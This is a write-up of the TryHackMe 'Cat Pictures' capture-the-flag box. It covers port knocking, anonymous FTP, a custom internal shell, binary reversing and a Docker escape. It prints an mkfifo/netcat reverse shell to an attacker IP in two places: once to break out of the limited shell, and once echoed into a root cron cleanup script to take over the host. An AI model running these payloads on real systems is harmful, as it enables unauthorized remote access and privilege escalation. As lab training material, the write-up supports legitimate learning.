---
layout: single
classes: wide
title: "TryHackMe Cat Pictures"
header:
  teaser: /assets/images/apa.png
excerpt: "Cat Pictures is an easy box that I found on Tryhackme."
---

Cat Pictures is an easy box that I found on Tryhackme by [gamercat](https://tryhackme.com/p/gamercat). I find this box useful for learning, so if you are a beginner, do not hesitate to do it.

 1. [NMAP(Port Scanning)](#nmap)
 2. [Web server](#web-server)
 3. [Port knocking](#port-knocking)
 4. [Discover new open port](#new-open-port)
 5. [Internal Shell Service](#internal-shell-service-4420)
 6. [Reverse Engineering](#reverse-engineering)
 7. [Escaping docker container!](#escaping-docker-container)
 
## NMAP
#### Basic scan
 So first, with an nmap basic scan that shows us 2 open ports on the machine :
 
 ![Nmap](https://i.imgur.com/r5s4F7u.png)
 
## Web server
At the website we are greeted with the phpBB forum "Cat Pictures".
There is only one post, who is it :

![site](https://i.imgur.com/iTbyWYs.png)


## Port knocking
To understand, you must first know what "Port knocking" is : [port knocking Wikipedia](https://en.wikipedia.org/wiki/Port_knocking)
So basically we just have to knock the ports we have.

![knock knock](https://i.imgur.com/1H58hzg.png)


## New open port 
By doing a netcat again, we find that port 21(ftp) is now "open" and anonymous login is alloweed.
In the FTP we have just a file named "note.txt"
Let's read its contents :

    ❯ cat note.txt   

> "In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
Connect to port 4420, the password is s******t.
Catlover"

So let's connect to port 4420 with the password>

## Internal Shell Service (4420)

![ISS](https://i.imgur.com/PfqlWIK.png)

We get some kind of internal custom shell that is quite limited. This also might be running in a docker container. 
#### Interesting file
In the /home/catlover we can see an interesting file named "runme".
Trying to execute it with the internal shell yields no results:

    ❯ home/catlover/runme

> THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.

So let's try to have a better shell.

In the "/bin" folder, there is nc so let's just do a rev shell with -> 

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
    
![rev1](https://i.imgur.com/B2robFX.png)

Now we can execute the binary :

    ./runme 
    Please enter yout password: test
    Access Denied
    
So let's transfer the binary to my machine so that we can analyze it.

## Reverse Engineering
I reverse it with radare2, but it's easily doable with ghidra, gdb, IDA or any simple disassembler. 
To download it : 
on attacking machine : 

    nc -vlp PORT > runme
    nc -N ATTACKING_IP PORT < /home/catlover/runme
    
So let's disass it with r2 now :

![disas](https://i.imgur.com/Yog9NfJ.png)

Now we have the pass of the binary.
Let's run it to see.

![key](https://i.imgur.com/YOmnTKk.png)

Nice! We can now login in the ssh

Don't forget to chmod 600 the key :)

## Escaping docker container

We are now root of the docker, we can see the first flag and try to find a way to escape.
A quick [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) scan shows us the following :

    ...
    [+] System stats
    Filesystem      Size  Used Avail Use% Mounted on
    overlay          20G  7.3G   12G  40% /
    tmpfs            64M     0   64M   0% /dev
    tmpfs           492M     0  492M   0% /sys/fs/cgroup
    shm              64M     0   64M   0% /dev/shm
    /dev/xvda1       20G  7.3G   12G  40% /opt/clean
    ...

Let's check the "/opt/clean" folder.
In this folder, there is a simple bash script "clean.sh that we can edit."

    #!/bin/bash
    rm -rf /tmp/*
    
It looks like this script could be run as a cron job on the root host system to clean up the "/tmp"

So let's echo a reverse shell in it to try. 

    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" > clean.sh

Just wait..

![root](https://i.imgur.com/evytCkD.png)

**rooted!**

